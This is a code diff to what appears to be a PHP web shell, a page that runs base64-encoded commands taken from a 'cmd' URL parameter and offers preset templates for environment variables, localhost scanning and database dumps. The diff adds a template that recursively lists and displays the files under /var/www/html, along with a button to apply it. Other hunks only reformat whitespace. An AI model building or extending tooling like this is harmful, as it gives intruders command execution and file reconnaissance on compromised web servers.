@@ -523,6 +523,72 @@ foreach ($databaseStructure as $dbname => $tables) {
     echo "<br>"; // Add an empty line for readability
 }
   `;
+  
+// NEW: Recursive Directory Listing Template
+const recursiveDirectoryListingTemplate = `
+// Function to recursively scan directory and list contents
+function listDirectoryContents($directory, $indentLevel = 0)
+{
+    // Check if the directory exists
+    if (!is_dir($directory)) {
+        echo str_repeat(" ", $indentLevel * 4) . "[Error] Directory not found: $directory\\n";
+        return;
+    }
+
+    // Open the directory
+    $files = scandir($directory);
+
+    echo '<ul style="list-style-type: none;">';
+
+    foreach ($files as $file) {
+        // Skip special directories '.' and '..'
+        if ($file === '.' || $file === '..') {
+            continue;
+        }
+
+        $filePath = $directory . DIRECTORY_SEPARATOR . $file;
+
+        // Print the current file or folder
+        if (is_dir($filePath)) {
+            // Add a toggle for folders
+            echo '<li><span class="toggle-folder" style="cursor: pointer;">[+]</span> ' . htmlspecialchars($file) . '<ul class="folder-contents" style="display: none; margin-left: 20px;">';
+            listDirectoryContents($filePath, $indentLevel + 1);
+            echo '</ul></li>';
+        } else {
+            echo '<li>' . htmlspecialchars($file) . '</li>';
+        }
+    }
+
+    echo '</ul>';
+}
+
+$rootDirectory = "/var/www/html"; // CHANGE ME
+
+// HTML Output
+echo '<!DOCTYPE html><html><head><title>Directory Listing</title>';
+echo '<script>
+document.addEventListener("DOMContentLoaded", function() {
+    const toggles = document.querySelectorAll(".toggle-folder");
+    toggles.forEach(toggle => {
+        toggle.addEventListener("click", function() {
+            const folderContents = this.parentNode.querySelector(".folder-contents");
+            if (folderContents.style.display === "none") {
+                folderContents.style.display = "block";
+                this.textContent = "[-]";
+            } else {
+                folderContents.style.display = "none";
+                this.textContent = "[+]";
+            }
+        });
+    });
+});
+<\/script>';
+echo '</head><body>';
+listDirectoryContents($rootDirectory);
+echo '</body></html>';
+`;
+
+
 
     // Encode user input as Base64
     function encodeBase64() {
@@ -545,10 +611,10 @@ foreach ($databaseStructure as $dbname => $tables) {
       const encodedCmd = urlParams.get('cmd');
       const prefillButton = document.getElementById('prefillButton');
       if (encodedCmd) {
-	prefillButton.style.display = 'inline-block'; // Show the button
-	} else {
-	  prefillButton.style.display = 'none'; // Hide the button
-	}
+    prefillButton.style.display = 'inline-block'; // Show the button
+    } else {
+      prefillButton.style.display = 'none'; // Hide the button
+    }
       if (encodedCmd) {
         try {
           const decodedCmd = atob(encodedCmd);
@@ -575,8 +641,8 @@ foreach ($databaseStructure as $dbname => $tables) {
       <br>
       <button type="submit">Execute</button>
         <?php if (!empty($_GET['cmd'])): ?>
-    	  <button id="prefillButton" type="button" onclick="prefillLastCommand()">Prefill Last Command</button>
-	<?php endif; ?>
+          <button id="prefillButton" type="button" onclick="prefillLastCommand()">Prefill Last Command</button>
+    <?php endif; ?>
     </form>
   </div>
 
@@ -597,6 +663,7 @@ foreach ($databaseStructure as $dbname => $tables) {
       <button type="button" onclick="applyTemplate(installedPHPModulesTemplate)">Installed PHP Modules</button>
       <button type="button" onclick="applyTemplate(environmentVariablesTemplate)">Environment Variables</button>
       <button type="button" onclick="applyTemplate(scanLocalhostTemplate)">Scan Localhost</button>
+      <button type="button" onclick="applyTemplate(recursiveDirectoryListingTemplate)">Recursive Directory Listing</button>
     </div>
   </div>
 
